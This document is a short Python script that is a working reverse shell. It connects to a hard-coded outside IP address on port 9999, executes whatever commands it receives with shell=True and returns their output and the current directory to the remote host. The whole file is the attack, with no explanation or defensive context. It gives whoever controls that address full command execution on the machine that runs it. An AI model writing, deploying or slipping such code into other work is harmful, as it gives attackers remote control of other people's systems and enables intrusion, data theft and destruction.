#!/usr/bin/env python3

import socket
import os
import subprocess

s = socket.socket()
host = '209.97.131.176'
port = 9999

s.connect((host, port))

while True:
	data = s.recv(1024)
	if data[:2].decode('utf-8') == 'cd':
		os.chdir(data[3:].decode('utf-8')) 
	
	if len(data) > 0:
		cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
		output_byte = cmd.stdout.read() + cmd.stderr.read()
		output_str = str(output_byte, 'utf-8')
		working_dir = os.getcwd() + '> '
		s.send(str.encode(output_str + working_dir))

		print(output_str)

